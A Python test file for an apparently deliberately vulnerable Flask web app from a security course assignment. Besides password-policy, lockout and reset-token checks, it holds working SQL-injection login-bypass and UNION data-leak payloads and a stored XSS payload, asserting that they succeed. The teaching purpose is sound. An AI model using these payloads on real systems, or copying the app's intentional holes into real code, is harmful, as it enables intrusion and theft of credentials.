import unittest
import os
import sys

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

# Add BASE_DIR to sys.path
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from vulnerable_version.app import app, get_db
from vulnerable_version.database.init_db import init_database
from vulnerable_version.utils.auth_helpers import hash_password, verify_password, load_password_policy

class TestVulnerableApp(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        # Reset and seed database before running tests
        init_database()
        app.config["TESTING"] = True
        cls.client = app.test_client()

    def test_01_password_policy_and_hmac_registration(self):
        """Test Part A Section 1: Register with HMAC+Salt and policy checks."""
        # 1. Password that is too short (<10 chars) should fail
        resp = self.client.post("/register", data={
            "username": "short_user",
            "email": "short@test.com",
            "password": "Ab1!",
            "confirm_password": "Ab1!"
        }, follow_redirects=True)
        self.assertIn("הסיסמה קצרה מדי".encode("utf-8"), resp.data)

        # 2. Dictionary word should fail
        resp = self.client.post("/register", data={
            "username": "dict_user",
            "email": "dict@test.com",
            "password": "Password123!@#",
            "confirm_password": "Password123!@#"
        }, follow_redirects=True)
        self.assertIn("מתוך מילון המערכת".encode("utf-8"), resp.data)

        # 3. Valid complex password should succeed and store with HMAC+Salt
        resp = self.client.post("/register", data={
            "username": "legit_user_1",
            "email": "legit1@test.com",
            "password": "MySuperSecret#2026",
            "confirm_password": "MySuperSecret#2026"
        }, follow_redirects=True)
        self.assertIn("ההרשמה בוצעה בהצלחה".encode("utf-8"), resp.data)

        # Verify DB entry uses HMAC + Salt
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE username = 'legit_user_1'")
        user = cursor.fetchone()
        conn.close()

        self.assertIsNotNone(user)
        self.assertNotEqual(user["password_hash"], "MySuperSecret#2026")
        self.assertTrue(verify_password("MySuperSecret#2026", user["salt"], user["password_hash"]))

    def test_02_sqli_login_bypass(self):
        """Test Part B Section 2 & Part A Section 3: SQLi on Login screen."""
        # SQL Injection login bypass payload: admin_cyber' --
        resp = self.client.post("/login", data={
            "username": "admin_cyber' --",
            "password": ""  # No password needed because of SQLi bypass!
        }, follow_redirects=True)

        self.assertEqual(resp.status_code, 200)
        # Should be authenticated and redirected to dashboard
        self.assertIn("עקיפת SQL Injection".encode("utf-8"), resp.data)
        self.assertIn("admin_cyber".encode("utf-8"), resp.data)

    def test_03_login_lockout_policy(self):
        """Test Part A Section 3: Lockout after 3 failed login attempts."""
        policy = load_password_policy()
        max_attempts = policy.get("max_login_attempts", 3)

        # Try 3 wrong passwords
        for i in range(max_attempts):
            resp = self.client.post("/login", data={
                "username": "user_israel",
                "password": f"WrongPassword{i}!"
            }, follow_redirects=True)

        # 4th attempt should be blocked due to account lockout
        resp = self.client.post("/login", data={
            "username": "user_israel",
            "password": "P@ssw0rdSecure!"  # Correct password but account is locked!
        }, follow_redirects=True)
        self.assertIn("חשבון זה נעול".encode("utf-8"), resp.data)

    def test_04_change_password_history_check(self):
        """Test Part A Section 2: Change password enforces history count of 3."""
        # Login with admin_cyber using correct credentials
        with self.client.session_transaction() as sess:
            sess["user_id"] = 1
            sess["username"] = "admin_cyber"

        # Try changing to current password ("Cyber@2026Admin!") - should be rejected by history check
        resp = self.client.post("/change-password", data={
            "current_password": "Cyber@2026Admin!",
            "new_password": "Cyber@2026Admin!",
            "confirm_password": "Cyber@2026Admin!"
        }, follow_redirects=True)
        self.assertIn("הייתה בשימוש ב-3 הסיסמאות האחרונות".encode("utf-8"), resp.data)

        # Change to a new valid password
        resp = self.client.post("/change-password", data={
            "current_password": "Cyber@2026Admin!",
            "new_password": "NewAdminPass#999!",
            "confirm_password": "NewAdminPass#999!"
        }, follow_redirects=True)
        self.assertIn("הסיסמה שונתה בהצלחה".encode("utf-8"), resp.data)

    def test_05_forgot_password_sha1_token(self):
        """Test Part A Section 5: Forgot password generates random SHA-1 token."""
        resp = self.client.post("/forgot-password", data={
            "identity": "admin_cyber"
        }, follow_redirects=True)

        self.assertEqual(resp.status_code, 200)
        self.assertIn("נשלח ערך אימות SHA-1 למייל שלך".encode("utf-8"), resp.data)

        # Verify token in DB is 40 hex chars (SHA-1 length)
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("SELECT token_sha1 FROM password_resets WHERE user_id = 1 ORDER BY id DESC LIMIT 1")
        row = cursor.fetchone()
        conn.close()

        self.assertIsNotNone(row)
        token = row["token_sha1"]
        self.assertEqual(len(token), 40, "Token must be a valid 40-character SHA-1 hex string")

        # Test verification and password reset using the token
        resp = self.client.post("/verify-reset-token", data={"token": token}, follow_redirects=True)
        self.assertIn("קביעת סיסמה חדשה".encode("utf-8"), resp.data)

        # Reset to new password
        resp = self.client.post("/reset-password", data={
            "token": token,
            "new_password": "BrandNewResetPass#2026",
            "confirm_password": "BrandNewResetPass#2026"
        }, follow_redirects=True)
        self.assertIn("הסיסמה אופסה בהצלחה".encode("utf-8"), resp.data)

    def test_06_stored_xss_in_section_4(self):
        """Test Part B Section 1 & Part A Section 4: Stored XSS in Add Customer."""
        with self.client.session_transaction() as sess:
            sess["user_id"] = 1
            sess["username"] = "admin_cyber"

        # Inject Stored XSS script tag payload in customer name (using double quotes inside script)
        xss_payload = '<script>alert("Stored XSS in Comunication_LTD!");</script>'
        resp = self.client.post("/add-customer", data={
            "full_name": xss_payload,
            "identity_number": "999888777",
            "email": "xss_victim@test.com",
            "phone": "052-9999999",
            "sector_id": "1",
            "package_id": "2",
            "notes": "Testing stored XSS vulnerability"
        }, follow_redirects=True)

        self.assertEqual(resp.status_code, 200)
        # Check that the raw script tag is present unescaped in HTML response!
        self.assertIn(xss_payload.encode("utf-8"), resp.data, "Vulnerable app must render unescaped script tag, proving Stored XSS")

    def test_07_sqli_in_section_4_customer_search(self):
        """Test Part B Section 2: SQLi in customer search (UNION injection)."""
        with self.client.session_transaction() as sess:
            sess["user_id"] = 1
            sess["username"] = "admin_cyber"

        # UNION SQLi to leak admin username into the customer list
        sqli_payload = "' UNION SELECT u.id, u.username, u.email, u.salt, u.password_hash, 'LEAK_SEC', 'LEAK_PKG', 'LEAK_NOTES' FROM users u --"
        resp = self.client.get(f"/dashboard?q={sqli_payload}")

        self.assertEqual(resp.status_code, 200)
        # Verify that user record data leaked into the customer dashboard
        self.assertIn("admin_cyber".encode("utf-8"), resp.data)
        self.assertIn("LEAK_SEC".encode("utf-8"), resp.data)

    def test_08_mailbox_integration(self):
        """Test Part A Section 5: Mailbox renders sent SHA-1 emails."""
        resp = self.client.get("/mailbox")
        self.assertEqual(resp.status_code, 200)
        self.assertIn("מרכז דואר יוצא".encode("utf-8"), resp.data)

if __name__ == "__main__":
    unittest.main()
